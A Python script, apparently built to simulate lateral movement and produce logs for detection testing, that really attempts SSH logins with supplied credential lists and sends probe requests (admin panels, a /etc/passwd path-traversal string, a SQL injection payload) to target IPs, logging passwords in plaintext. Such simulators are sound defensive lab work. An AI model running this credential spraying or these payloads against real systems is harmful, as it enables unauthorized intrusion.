# scripts/lateral_movement_simulator.py
import paramiko
import requests
import json
from datetime import datetime
import os
import time

# Funzione per ottenere l'IP locale (copiata per self-containment)
def get_local_ip():
    try:
        response = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip",
                                headers={"Metadata-Flavor": "Google"}, timeout=0.5)
        if response.status_code == 200:
            return response.text
    except requests.exceptions.RequestException:
        pass
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

LOCAL_IP = get_local_ip()

def simulate_lateral_movement(target_ips, credentials, log_file="/var/log/malicious_traffic.log"):
    """
    Simula tentativi di movimento laterale utilizzando SSH e HTTP.
    """
    print(f"[Lateral Movement] Starting lateral movement simulation...")

    os.makedirs(os.path.dirname(log_file), exist_ok=True)

    for target_ip in target_ips:
        # Tentativi SSH
        for cred in credentials:
            username = cred["username"]
            password = cred["password"]
            timestamp = datetime.now().isoformat()
            
            print(f"[Lateral Movement - SSH] Attempting SSH to {target_ip} with {username}:{password}...")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, username=username, password=password, timeout=5)
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_SSH",
                    "source_ip": LOCAL_IP,
                    "target_ip": target_ip,
                    "target_port": 22,
                    "protocol": "SSH",
                    "username_attempted": username,
                    "password_attempted": password, # ATTENZIONE: in un sistema reale, non loggare password!
                    "status": "Success",
                    "message": f"Lateral movement SSH succeeded to {target_ip} with {username}:{password}"
                }
                print(f"[Lateral Movement - SSH] SUCCESS to {target_ip} with {username}:{password}")
                client.close()
            except paramiko.AuthenticationException:
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_SSH",
                    "source_ip": LOCAL_IP,
                    "target_ip": target_ip,
                    "target_port": 22,
                    "protocol": "SSH",
                    "username_attempted": username,
                    "password_attempted": password,
                    "status": "Failed_Auth",
                    "message": f"Lateral movement SSH failed (auth) to {target_ip} with {username}:{password}"
                }
                print(f"[Lateral Movement - SSH] FAILED (Auth) to {target_ip} with {username}:{password}")
            except Exception as e:
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_SSH",
                    "source_ip": LOCAL_IP,
                    "target_ip": target_ip,
                    "target_port": 22,
                    "protocol": "SSH",
                    "username_attempted": username,
                    "password_attempted": password,
                    "status": "Failed_Other",
                    "error": str(e),
                    "message": f"Lateral movement SSH error to {target_ip} with {username}:{password}: {e}"
                }
                print(f"[Lateral Movement - SSH] FAILED (Error) to {target_ip}: {e}")
            
            with open(log_file, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
            time.sleep(1)

        # Tentativi HTTP (es. accesso a pannelli admin, directory traversal)
        http_paths = ["/admin", "/phpmyadmin", "/wp-admin", "/../etc/passwd", "/index.php?id=1%27union%20select%201,2,3--"]
        for path in http_paths:
            url = f"http://{target_ip}{path}"
            timestamp = datetime.now().isoformat()

            print(f"[Lateral Movement - HTTP] Attempting HTTP GET {url}...")
            try:
                response = requests.get(url, timeout=5)
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_HTTP",
                    "source_ip": LOCAL_IP,
                    "target_url": url,
                    "target_ip": target_ip,
                    "target_port": 80,
                    "protocol": "HTTP",
                    "status_code": response.status_code,
                    "response_size": len(response.content),
                    "status": "Success_Response",
                    "message": f"Lateral movement HTTP to {url}. Status: {response.status_code}"
                }
                print(f"[Lateral Movement - HTTP] Success: {url} -> {response.status_code}")
            except requests.exceptions.ConnectionError as e:
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_HTTP",
                    "source_ip": LOCAL_IP,
                    "target_url": url,
                    "target_ip": target_ip,
                    "target_port": 80,
                    "protocol": "HTTP",
                    "status": "Failed_Connection",
                    "error": str(e),
                    "message": f"Lateral movement HTTP failed (connection) to {url}: {e}"
                }
                print(f"[Lateral Movement - HTTP] FAILED (Conn): {url} -> {e}")
            except requests.exceptions.Timeout as e:
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_HTTP",
                    "source_ip": LOCAL_IP,
                    "target_url": url,
                    "target_ip": target_ip,
                    "target_port": 80,
                    "protocol": "HTTP",
                    "status": "Failed_Timeout",
                    "error": str(e),
                    "message": f"Lateral movement HTTP timed out for {url}: {e}"
                }
                print(f"[Lateral Movement - HTTP] FAILED (Timeout): {url} -> {e}")
            except Exception as e:
                log_entry = {
                    "timestamp": timestamp,
                    "event_type": "Malicious_LateralMovement_HTTP",
                    "source_ip": LOCAL_IP,
                    "target_url": url,
                    "target_ip": target_ip,
                    "target_port": 80,
                    "protocol": "HTTP",
                    "status": "Failed_Other",
                    "error": str(e),
                    "message": f"An unexpected error during HTTP lateral movement for {url}: {e}"
                }
                print(f"[Lateral Movement - HTTP] FAILED (Error): {url} -> {e}")

            with open(log_file, "a") as f:
                f.write(json.dumps(log_entry) + "\n")
            time.sleep(1)


if __name__ == '__main__':
    # Esempio di utilizzo standalone per test locali
    test_target_ips = ["127.0.0.1"]
    test_credentials = [{"username": "testuser", "password": "wrongpass"}, {"username": "your_ssh_user", "password": "your_ssh_password"}] # Sostituisci con credenziali reali per test
    simulate_lateral_movement(test_target_ips, test_credentials)